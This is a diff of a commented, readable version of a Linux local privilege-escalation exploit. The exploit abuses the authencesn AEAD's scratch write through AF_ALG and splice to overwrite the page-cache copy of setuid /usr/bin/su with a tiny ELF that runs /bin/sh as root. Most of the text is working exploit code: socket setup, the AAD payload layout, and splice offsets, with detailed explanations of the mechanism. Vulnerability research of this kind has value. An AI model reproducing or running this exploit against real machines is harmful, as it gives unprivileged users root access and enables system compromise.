@@ -4,12 +4,15 @@
 # Original: copy_fail_exp.py (one-letter aliases, raw numeric constants, hex blobs).
 # This file: same behavior, named constants, explanatory comments.
 #
-# Bug class: page-cache corruption via AF_ALG splice. Spliced page-cache pages
-# are handed to the kernel crypto layer which writes attacker-supplied bytes
-# back into them without a defensive copy. We use this to overwrite the
-# in-memory copy of /usr/bin/su (a setuid-root binary) with a tiny static ELF
-# that does setreuid(0,0) + execve("/bin/sh"), then exec it via system("su").
-# The on-disk file is never modified.
+# Bug class: page-cache corruption via AF_ALG splice. The authencesn AEAD
+# does an internal scratch copy of bytes 4..7 of the AAD into the destination
+# buffer at dst[assoclen + cryptlen]. The vulnerable AF_ALG in-place path
+# uses the spliced page-cache page as the destination buffer, so that scratch
+# copy lands in the page cache instead of in private kernel memory.
+# Result: 4 attacker-chosen bytes per call, written to a chosen offset in the
+# in-memory copy of a file the attacker only has read access to.
+# Used here to overwrite /usr/bin/su (setuid-root) with a 160-byte static ELF
+# that runs /bin/sh as root. The on-disk file is never modified.
 
 import os
 import socket
@@ -26,9 +29,9 @@ import zlib
 # the kernel from rejecting the request before we reach the bug.
 AEAD_KEY = bytes.fromhex("0800010000000010" + "00" * 32)
 
-AAD_LEN   = 8                                  # first 8 bytes of input are AAD
-AUTH_SIZE = 4                                  # auth tag size; also the per-iteration write granularity
-OP        = socket.ALG_OP_DECRYPT               # 0
+AAD_LEN   = 8                                  # 8-byte AAD: bytes 0..3 are filler, bytes 4..7 are the payload that gets copied into page cache
+AUTH_SIZE = 4                                  # AEAD tag length; affects cryptlen and so the offset of the scratch write, not its size (size is hardcoded to 4 by authencesn)
+OP        = socket.ALG_OP_DECRYPT
 IV        = struct.pack("<I", 16) + b"\x00" * 16  # struct af_alg_iv: ivlen=16, then 16 zero bytes
 
 TARGET_PATH = "/usr/bin/su"
@@ -47,17 +50,18 @@ PATCH_ELF = zlib.decompress(bytes.fromhex(
 def overwrite_chunk(file_fd: int, offset: int, four_bytes: bytes) -> None:
     """Overwrite 4 bytes at `offset` in the page-cache copy of file_fd."""
     sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
-    # authencesn = "authenc with extended sequence number" (IPsec ESP-ESN).
-    # Its internal AAD/IV layout assumptions are what reach the bug; other
-    # AEADs like gcm(aes) don't trigger it.
+    # authencesn = authenc with IPsec extended sequence numbers. Required for
+    # the bug: it is the AEAD whose internal scratch copy of AAD[4:8] into
+    # dst[assoclen + cryptlen] is what writes into the spliced page. Other
+    # AEADs like gcm(aes) do not have that scratch write and cannot be used.
     sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
     sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, AEAD_KEY)
     sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_AEAD_AUTHSIZE, None, AUTH_SIZE)
 
     op_sock, _ = sock.accept()
 
-    # 8-byte sendmsg payload becomes the AAD (assoclen=8). The splice that
-    # follows feeds page-cache-backed plaintext.
+    # 8-byte AAD. Bytes 0..3 ("AAAA") are filler. Bytes 4..7 are what gets
+    # copied verbatim into the page cache.
     op_sock.sendmsg(
         [b"AAAA" + four_bytes],
         [
@@ -68,12 +72,14 @@ def overwrite_chunk(file_fd: int, offset: int, four_bytes: bytes) -> None:
         socket.MSG_MORE,
     )
 
+    # Splice picks splice_len bytes from the file into the pipe as page
+    # references, then into the AF_ALG socket. The in-place AEAD path uses
+    # those same pages as the destination buffer. The scratch write at
+    # dst[assoclen + cryptlen] = dst[offset + 8] lands at file offset `offset`.
     splice_len = offset + 4
 
-    # Zero-copy: page-cache pages of /usr/bin/su land in the pipe directly.
     pipe_r, pipe_w = os.pipe()
     os.splice(file_fd, pipe_w, splice_len, offset_src=0)
-    # And then directly into the AF_ALG socket - no defensive copy. The bug.
     os.splice(pipe_r, op_sock.fileno(), splice_len)
 
     try:
